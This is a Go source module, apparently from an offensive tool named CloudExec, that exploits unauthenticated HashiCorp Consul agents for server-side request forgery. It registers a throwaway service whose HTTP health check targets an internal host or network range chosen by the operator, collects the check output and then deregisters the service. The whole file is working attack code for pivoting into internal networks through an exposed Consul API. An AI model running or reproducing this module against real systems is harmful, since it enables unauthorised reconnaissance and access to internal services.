package modules

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/cotsom/CloudExec/internal/utils"
)

type Ssrf struct {
}

type ServiceCheck struct {
	HTTP     string `json:"HTTP,omitempty"`
	Interval string `json:"interval,omitempty"`
}

type ServiceRegistration struct {
	ID      string        `json:"ID"`
	Name    string        `json:"Name"`
	Address string        `json:"Address"`
	Port    int           `json:"Port"`
	Check   *ServiceCheck `json:"check,omitempty"`
}

type AgentCheck struct {
	Node        string `json:"Node"`
	CheckID     string `json:"CheckID"`
	Name        string `json:"Name"`
	Status      string `json:"Status"`
	Notes       string `json:"Notes"`
	Output      string `json:"Output"`
	serviceID   string `json:"serviceID"`
	ServiceName string `json:"ServiceName"`
	Interval    string `json:"Interval"`
}

func (m Ssrf) RunModule(target string, flags map[string]string, scheme string) {
	defport := "8500"
	if flags["port"] != "" {
		defport = flags["port"]
	}

	if flags["timeout"] == "" {
		flags["timeout"] = "3"
	}
	timeout, _ := strconv.Atoi(flags["timeout"])

	ssrfTargets := []string{flags["ssrf-target"]}

	if flags["ssrf-network"] != "" {
		ssrfTargets = utils.ParseTargets(flags["ssrf-network"])
		for i, currTarget := range ssrfTargets {
			ssrfTargets[i] = fmt.Sprintf("http://%s:%s", currTarget, flags["ssrf-port"])
		}
	}

	//MAIN LOGIC
	var wg sync.WaitGroup
	var sem chan struct{}

	//set threads
	threads, err := strconv.Atoi(flags["threads"])
	if err != nil {
		fmt.Println("You have to set correct number of threads")
		os.Exit(0)
	}
	sem = make(chan struct{}, threads)

	progress := 0
	for i, ssrfTarget := range ssrfTargets {
		wg.Add(1)
		sem <- struct{}{}
		go makeSsrfRequest(&wg, sem, flags, target, defport, ssrfTarget, timeout, scheme)
		utils.ProgressBar(len(ssrfTargets), i+1, &progress)
	}
	fmt.Println("")
	wg.Wait()
}

func makeSsrfRequest(wg *sync.WaitGroup, sem chan struct{}, flags map[string]string, target string, defport string, ssrfTarget string, timeout int, scheme string) {
	defer func() {
		<-sem
		wg.Done()
	}()

	client := http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}

	url := fmt.Sprintf("%s://%s:%s", scheme, target, defport)

	serviceName := fmt.Sprintf("testservice-%s", utils.RandStringRunes(10))
	reg := ServiceRegistration{
		ID:      serviceName,
		Name:    serviceName,
		Address: "127.0.0.1",
		Port:    80,
		Check: &ServiceCheck{
			HTTP:     ssrfTarget,
			Interval: "1s",
		},
	}

	if err := registerService(&client, url, reg); err != nil {
		utils.Colorize(utils.ColorRed, fmt.Sprintf("%s[!] %s:%s - %s\n", utils.ClearLine, target, flags["port"], err))
		return
	}

	time.Sleep(2 * time.Second)

	checks, err := getChecks(client, url)
	if err != nil {
		fmt.Fprintln(os.Stderr, "get checks error:", err)
		_ = deregisterService(client, url, serviceName)
		return
	}

	found := false
	for key, c := range checks {
		if c.serviceID == serviceName || c.CheckID == "service:"+serviceName || key == "service:"+serviceName {
			if c.Output != "" {
				utils.Colorize(utils.ColorYellow, fmt.Sprintf("[+] %s - %s", ssrfTarget, c.Output))
			}
			found = true
			break
		}
	}
	if !found {
		fmt.Println("check wasn't found for svc", serviceName)
	}

	// fmt.Printf("Deregistering service %q ...\n", serviceName)
	if err := deregisterService(client, url, serviceName); err != nil {
		fmt.Fprintln(os.Stderr, "deregister error:", err)
		return
	}
	// fmt.Println("Deregistered.")
}

func registerService(client *http.Client, addr string, reg ServiceRegistration) error {
	url := fmt.Sprintf("%s/v1/agent/service/register", addr)
	b, err := json.Marshal(reg)
	if err != nil {
		return err
	}

	resp, err := utils.HttpRequest(url, http.MethodPut, b, *client)

	if err != nil {
		return err
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return fmt.Errorf("access denied registering service (HTTP %d) — token required or insufficient rights", resp.StatusCode)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("unexpected status registering service: %d", resp.StatusCode)
	}
	return nil
}

func getChecks(client http.Client, addr string) (map[string]AgentCheck, error) {
	url := fmt.Sprintf("%s/v1/agent/checks", addr)
	resp, err := utils.HttpRequest(url, http.MethodGet, []byte(""), client)

	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return nil, fmt.Errorf("access denied reading checks (HTTP %d) - token required or insufficient rights", resp.StatusCode)
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("unexpected status reading checks: %d", resp.StatusCode)
	}

	dec := json.NewDecoder(io.LimitReader(resp.Body, 2<<20))
	out := make(map[string]AgentCheck)
	if err := dec.Decode(&out); err != nil {
		return nil, err
	}
	return out, nil
}

func deregisterService(client http.Client, addr string, serviceName string) error {
	url := fmt.Sprintf("%s/v1/agent/service/deregister/%s", addr, serviceName)
	resp, err := utils.HttpRequest(url, http.MethodPut, []byte(""), client)

	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return fmt.Errorf("access denied deregistering service (HTTP %d) — token required or insufficient rights", resp.StatusCode)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("unexpected status deregistering service: %d", resp.StatusCode)
	}
	return nil
}
